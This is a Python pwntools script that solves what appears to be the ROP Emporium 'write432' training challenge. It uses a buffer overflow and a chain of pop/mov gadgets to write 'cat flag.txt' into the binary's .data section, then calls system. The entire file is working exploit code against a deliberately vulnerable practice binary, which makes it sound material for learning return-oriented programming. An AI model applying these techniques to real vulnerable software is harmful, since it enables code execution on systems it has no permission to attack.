#!/usr/bin/python
from pwn import *

context.log_level = 'debug'

elf = context.binary = ELF("write432")

#addresses
offset = 44
sh = 'cat flag.txt'
ptr_data = elf.get_section_by_name(".data").header.sh_addr #0x0804a028 #.data
#ptr_system = 0x08048430  #for a reason i'm unsure of this address (in the plt) does not work (recieve si_code=SEGV_ACCERR, si_addr=0x804a028), but works when calling the address in usefulFunction 0x0804865a
ptr_system = 0x0804865a 
pppr_gadget = 0x080486d9 
ppr_gadget = 0x080486da #pop edi; pop ebp; ret
mov_gadget = 0x08048670 #mov dword [edi], ebp; ret
addy = 'B'*4

def main():


    payload = 'A' * offset 
    payload += p32(ppr_gadget) + p32(ptr_data) + sh[:4] + p32(mov_gadget)  
    payload += p32(ppr_gadget) + p32(ptr_data+4) + sh[4:8] + p32(mov_gadget)
    payload += p32(ppr_gadget) + p32(ptr_data+8) + sh[8:] + p32(mov_gadget)
    payload += p32(ptr_system) + p32(ptr_data) + addy


    f = open("pattern.txt", "w")
    f.write(payload)
    f.close()

    p = process(elf.path)
    p.recvline()
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
